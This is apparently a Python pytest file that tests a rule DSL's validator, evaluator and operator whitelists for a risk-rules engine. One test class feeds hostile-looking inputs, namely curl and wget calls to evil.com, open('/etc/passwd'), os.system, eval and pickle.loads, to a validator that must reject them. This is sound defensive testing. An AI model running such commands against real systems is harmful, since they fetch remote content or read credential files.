"""DSL 模块单元测试：解析、校验、求值。"""

from __future__ import annotations

import pytest

from dkws.domain.errors import UsageError
from dkws.domain.rules.dsl import (
    ACTION_OPS,
    CALC_FUNCS,
    COMPARE_OPS,
    LOGIC_OPS,
    MAX_DEPTH,
    MAX_NODES,
    UNKNOWN,
    UnknownValue,
    WHITELIST,
    evaluate,
    validate_dsl,
    validate_rule_body_text,
)


# ---------- 常量 ----------

class TestConstants:
    def test_whitelist_is_superset(self):
        assert LOGIC_OPS | COMPARE_OPS | ACTION_OPS | CALC_FUNCS == WHITELIST

    def test_logic_ops(self):
        assert LOGIC_OPS == {"all", "any", "not"}

    def test_compare_ops(self):
        assert "eq" in COMPARE_OPS
        assert "is_null" in COMPARE_OPS

    def test_action_ops(self):
        assert ACTION_OPS == {"set", "emit", "require", "compute"}

    def test_calc_funcs(self):
        assert CALC_FUNCS == {"sum", "min", "max", "round", "date_diff"}


# ---------- UnknownValue ----------

class TestUnknownValue:
    def test_repr(self):
        assert repr(UNKNOWN) == "UNKNOWN"

    def test_singleton_is_unknown(self):
        assert isinstance(UNKNOWN, UnknownValue)


# ---------- validate_dsl ----------

class TestValidateDsl:
    def test_valid_eq(self):
        errors = validate_dsl({"eq": ["$facts.x", 1]})
        assert errors == []

    def test_valid_all(self):
        errors = validate_dsl({"all": [{"eq": ["$facts.a", 1]}, {"eq": ["$facts.b", 2]}]})
        assert errors == []

    def test_valid_any(self):
        errors = validate_dsl({"any": [{"eq": ["$facts.a", 1]}]})
        assert errors == []

    def test_valid_not(self):
        errors = validate_dsl({"not": {"eq": ["$facts.x", 0]}})
        assert errors == []

    def test_valid_in(self):
        errors = validate_dsl({"in": ["$facts.x", ["a", "b"]]})
        assert errors == []

    def test_valid_not_in(self):
        errors = validate_dsl({"not_in": ["$facts.x", ["c"]]})
        assert errors == []

    def test_valid_compute(self):
        errors = validate_dsl({"compute": {"total": {"sum": [1, 2]}}})
        assert errors == []

    def test_invalid_op(self):
        errors = validate_dsl({"hack": [1]})
        assert len(errors) == 1
        assert "非法操作" in errors[0]

    def test_multi_key_node(self):
        errors = validate_dsl({"eq": [1, 1], "ne": [2, 3]})
        assert len(errors) == 1
        assert "单键" in errors[0]

    def test_in_bad_format(self):
        # in 需要 [值, 列表]，不是单值
        errors = validate_dsl({"in": "bad"})
        assert len(errors) >= 1

    def test_in_second_arg_not_list(self):
        errors = validate_dsl({"in": ["$facts.x", "not_a_list"]})
        assert any("列表" in e for e in errors)

    def test_in_wrong_length(self):
        errors = validate_dsl({"in": ["$facts.x"]})
        assert len(errors) >= 1

    def test_not_in_wrong_length(self):
        errors = validate_dsl({"not_in": ["$facts.x", "a", "b"]})
        assert len(errors) >= 1

    def test_compute_not_dict(self):
        errors = validate_dsl({"compute": "not_dict"})
        assert any("映射" in e for e in errors)

    def test_invalid_ref(self):
        # 标量参数中的非法引用
        errors = validate_dsl({"emit": "$bad!"})
        assert any("非法字段引用" in e for e in errors)

    def test_invalid_ref_in_list_not_caught(self):
        # 列表参数中的非法引用不被 validate_dsl 检查（设计如此）
        errors = validate_dsl({"eq": ["$bad!", 1]})
        # 列表元素中的标量不经过 REF_RE 校验
        assert errors == []

    def test_valid_ref(self):
        errors = validate_dsl({"eq": ["$facts.x", 1]})
        assert errors == []

    def test_depth_exceeded(self):
        node = {"eq": ["$facts.x", 1]}
        for _ in range(MAX_DEPTH + 1):
            node = {"all": [node]}
        errors = validate_dsl(node)
        assert any("深度" in e for e in errors)

    def test_nodes_exceeded(self):
        nodes = [{"eq": ["$facts.x", i]} for i in range(MAX_NODES + 1)]
        node = {"all": nodes}
        errors = validate_dsl(node)
        assert any("节点数" in e for e in errors)

    def test_scalar_arg(self):
        errors = validate_dsl({"emit": "hello"})
        assert errors == []

    def test_list_of_nodes(self):
        errors = validate_dsl([{"eq": ["$facts.x", 1]}, {"eq": ["$facts.y", 2]}])
        assert errors == []


# ---------- validate_rule_body_text ----------

class TestValidateRuleBodyText:
    def test_safe_text(self):
        errors = validate_rule_body_text("客户风险等级为高")
        assert errors == []

    def test_eval_pattern(self):
        errors = validate_rule_body_text("eval(x)")
        assert len(errors) >= 1

    def test_exec_pattern(self):
        errors = validate_rule_body_text("exec(cmd)")
        assert len(errors) >= 1

    def test_import_pattern(self):
        errors = validate_rule_body_text("import os")
        assert len(errors) >= 1

    def test_subprocess_pattern(self):
        errors = validate_rule_body_text("subprocess.run()")
        assert len(errors) >= 1

    def test_os_system_pattern(self):
        errors = validate_rule_body_text("os.system('ls')")
        assert len(errors) >= 1

    def test_open_pattern(self):
        errors = validate_rule_body_text("open('/etc/passwd')")
        assert len(errors) >= 1

    def test_requests_pattern(self):
        errors = validate_rule_body_text("requests.get(url)")
        assert len(errors) >= 1

    def test_curl_pattern(self):
        errors = validate_rule_body_text("curl http://evil.com")
        assert len(errors) >= 1

    def test_wget_pattern(self):
        errors = validate_rule_body_text("wget http://evil.com")
        assert len(errors) >= 1

    def test_execfile_pattern(self):
        errors = validate_rule_body_text("execfile('x')")
        assert len(errors) >= 1

    def test_pickle_pattern(self):
        errors = validate_rule_body_text("pickle.loads(data)")
        assert len(errors) >= 1

    def test_compile_pattern(self):
        errors = validate_rule_body_text("compile(code)")
        assert len(errors) >= 1

    def test_case_insensitive(self):
        errors = validate_rule_body_text("EVAL(x)")
        assert len(errors) >= 1


# ---------- evaluate: logic ----------

class TestEvaluateLogic:
    def test_all_true(self):
        r = evaluate({"all": [{"eq": [1, 1]}, {"eq": [2, 2]}]}, {})
        assert r.value is True

    def test_all_false(self):
        r = evaluate({"all": [{"eq": [1, 1]}, {"eq": [2, 3]}]}, {})
        assert r.value is False

    def test_all_unknown(self):
        r = evaluate({"all": [{"eq": ["$facts.x", 1]}, {"eq": [2, 2]}]}, {})
        assert isinstance(r.value, UnknownValue)

    def test_any_true(self):
        r = evaluate({"any": [{"eq": [1, 2]}, {"eq": [2, 2]}]}, {})
        assert r.value is True

    def test_any_false(self):
        r = evaluate({"any": [{"eq": [1, 2]}, {"eq": [3, 4]}]}, {})
        assert r.value is False

    def test_any_unknown(self):
        r = evaluate({"any": [{"eq": ["$facts.x", 1]}, {"eq": [3, 4]}]}, {})
        assert isinstance(r.value, UnknownValue)

    def test_not_true(self):
        r = evaluate({"not": {"eq": [1, 2]}}, {})
        assert r.value is True

    def test_not_false(self):
        r = evaluate({"not": {"eq": [1, 1]}}, {})
        assert r.value is False

    def test_not_unknown(self):
        r = evaluate({"not": {"eq": ["$facts.x", 1]}}, {})
        assert isinstance(r.value, UnknownValue)


# ---------- evaluate: comparison ----------

class TestEvaluateComparison:
    def test_eq(self):
        r = evaluate({"eq": [1, 1]}, {})
        assert r.value is True

    def test_eq_false(self):
        r = evaluate({"eq": [1, 2]}, {})
        assert r.value is False

    def test_ne(self):
        r = evaluate({"ne": [1, 2]}, {})
        assert r.value is True

    def test_gt(self):
        r = evaluate({"gt": [5, 3]}, {})
        assert r.value is True

    def test_gte(self):
        r = evaluate({"gte": [3, 3]}, {})
        assert r.value is True

    def test_lt(self):
        r = evaluate({"lt": [3, 5]}, {})
        assert r.value is True

    def test_lte(self):
        r = evaluate({"lte": [3, 3]}, {})
        assert r.value is True

    def test_gt_non_number(self):
        r = evaluate({"gt": ["abc", 1]}, {})
        assert isinstance(r.value, UnknownValue)

    def test_eq_ref(self):
        r = evaluate({"eq": ["$facts.x", 10]}, {"x": 10})
        assert r.value is True

    def test_eq_unknown_ref(self):
        r = evaluate({"eq": ["$facts.x", 10]}, {})
        assert isinstance(r.value, UnknownValue)

    def test_eq_both_refs(self):
        r = evaluate({"eq": ["$facts.a", "$facts.b"]}, {"a": 5, "b": 5})
        assert r.value is True

    def test_compare_numeric_strings(self):
        r = evaluate({"gt": ["10", "5"]}, {})
        assert r.value is True

    def test_eq_trace(self):
        r = evaluate({"eq": [1, 1]}, {})
        assert any(t["op"] == "eq" for t in r.trace)


# ---------- evaluate: in / not_in ----------

class TestEvaluateIn:
    def test_in_true(self):
        r = evaluate({"in": ["$facts.x", ["a", "b"]]}, {"x": "a"})
        assert r.value is True

    def test_in_false(self):
        r = evaluate({"in": ["$facts.x", ["a", "b"]]}, {"x": "c"})
        assert r.value is False

    def test_not_in_true(self):
        r = evaluate({"not_in": ["$facts.x", ["a"]]}, {"x": "b"})
        assert r.value is True

    def test_in_unknown(self):
        r = evaluate({"in": ["$facts.x", ["a"]]}, {})
        assert isinstance(r.value, UnknownValue)

    def test_in_literal(self):
        r = evaluate({"in": ["a", ["a", "b"]]}, {})
        assert r.value is True


# ---------- evaluate: contains / starts_with ----------

class TestEvaluateContainsStartsWith:
    def test_contains_true(self):
        r = evaluate({"contains": ["$facts.x", "ell"]}, {"x": "hello"})
        assert r.value is True

    def test_contains_false(self):
        r = evaluate({"contains": ["$facts.x", "xyz"]}, {"x": "hello"})
        assert r.value is False

    def test_contains_unknown(self):
        r = evaluate({"contains": ["$facts.x", "a"]}, {})
        assert isinstance(r.value, UnknownValue)

    def test_starts_with_true(self):
        r = evaluate({"starts_with": ["$facts.x", "hel"]}, {"x": "hello"})
        assert r.value is True

    def test_starts_with_false(self):
        r = evaluate({"starts_with": ["$facts.x", "xyz"]}, {"x": "hello"})
        assert r.value is False

    def test_starts_with_unknown(self):
        r = evaluate({"starts_with": ["$facts.x", "a"]}, {})
        assert isinstance(r.value, UnknownValue)

    def test_contains_ref_sub(self):
        r = evaluate({"contains": ["$facts.s", "$facts.sub"]}, {"s": "hello", "sub": "ell"})
        assert r.value is True


# ---------- evaluate: exists / is_null ----------

class TestEvaluateExistsIsNull:
    def test_exists_true(self):
        r = evaluate({"exists": ["$facts.x"]}, {"x": 1})
        assert r.value is True

    def test_exists_false(self):
        r = evaluate({"exists": ["$facts.x"]}, {})
        assert r.value is False

    def test_is_null_true(self):
        r = evaluate({"is_null": ["$facts.x"]}, {"x": None})
        assert r.value is True

    def test_is_null_false(self):
        r = evaluate({"is_null": ["$facts.x"]}, {"x": 1})
        assert r.value is False

    def test_is_null_unknown(self):
        r = evaluate({"is_null": ["$facts.x"]}, {})
        assert isinstance(r.value, UnknownValue)


# ---------- evaluate: actions ----------

class TestEvaluateActions:
    def test_set(self):
        r = evaluate({"set": {"status": "approved", "level": 3}}, {})
        assert r.value == {"status": "approved", "level": 3}

    def test_set_with_nested_eval(self):
        r = evaluate({"set": {"result": {"eq": [1, 1]}}}, {})
        assert r.value == {"result": True}

    def test_emit(self):
        r = evaluate({"emit": "风险过高"}, {})
        assert r.value == {"message": "风险过高"}

    def test_require_list(self):
        r = evaluate({"require": ["补充材料", "面签"]}, {})
        assert r.value == {"requirements": ["补充材料", "面签"]}

    def test_require_single(self):
        r = evaluate({"require": "补充材料"}, {})
        assert r.value == {"requirements": ["补充材料"]}

    def test_compute(self):
        r = evaluate({"compute": {"total": {"sum": [10, 20]}}}, {})
        assert r.value == {"total": 30}


# ---------- evaluate: calc functions ----------

class TestEvaluateCalc:
    def test_sum(self):
        r = evaluate({"sum": [1, 2, 3]}, {})
        assert r.value == 6

    def test_min(self):
        r = evaluate({"min": [5, 3, 7]}, {})
        assert r.value == 3

    def test_max(self):
        r = evaluate({"max": [5, 3, 7]}, {})
        assert r.value == 7

    def test_round(self):
        r = evaluate({"round": [3.7]}, {})
        assert r.value == 4

    def test_date_diff_returns_unknown(self):
        r = evaluate({"date_diff": ["2026-01-01", "2026-01-10"]}, {})
        assert isinstance(r.value, UnknownValue)

    def test_sum_with_non_number(self):
        r = evaluate({"sum": [1, "abc"]}, {})
        assert isinstance(r.value, UnknownValue)

    def test_calc_scalar_arg(self):
        """calc 函数标量参数。"""
        r = evaluate({"round": 3.7}, {})
        assert r.value == 4


# ---------- evaluate: depth limit ----------

class TestEvaluateDepthLimit:
    def test_depth_exceeded(self):
        node = {"eq": [1, 1]}
        for _ in range(MAX_DEPTH + 1):
            node = {"all": [node]}
        with pytest.raises(UsageError, match="深度超限"):
            evaluate(node, {})


# ---------- evaluate: passthrough ----------

class TestEvaluatePassthrough:
    def test_scalar_passthrough(self):
        r = evaluate(42, {})
        assert r.value == 42

    def test_string_passthrough(self):
        r = evaluate("hello", {})
        assert r.value == "hello"

    def test_list_passthrough(self):
        r = evaluate([1, 2, 3], {})
        assert r.value == [1, 2, 3]

    def test_multi_key_dict_passthrough(self):
        """多键 dict 不匹配操作节点，原样返回。"""
        r = evaluate({"a": 1, "b": 2}, {})
        assert r.value == {"a": 1, "b": 2}

    def test_unknown_op_passthrough(self):
        """白名单外操作在 evaluate 中 fallthrough 返回原节点。"""
        # 注意：validate_dsl 会拒绝，但 evaluate 本身不校验
        r = evaluate({"custom_op": [1]}, {})
        assert r.value == {"custom_op": [1]}


# ---------- evaluate: trace ----------

class TestEvaluateTrace:
    def test_trace_populated(self):
        r = evaluate({"all": [{"eq": [1, 1]}, {"gt": [5, 3]}]}, {})
        assert len(r.trace) >= 2
        ops = {t["op"] for t in r.trace}
        assert "all" in ops
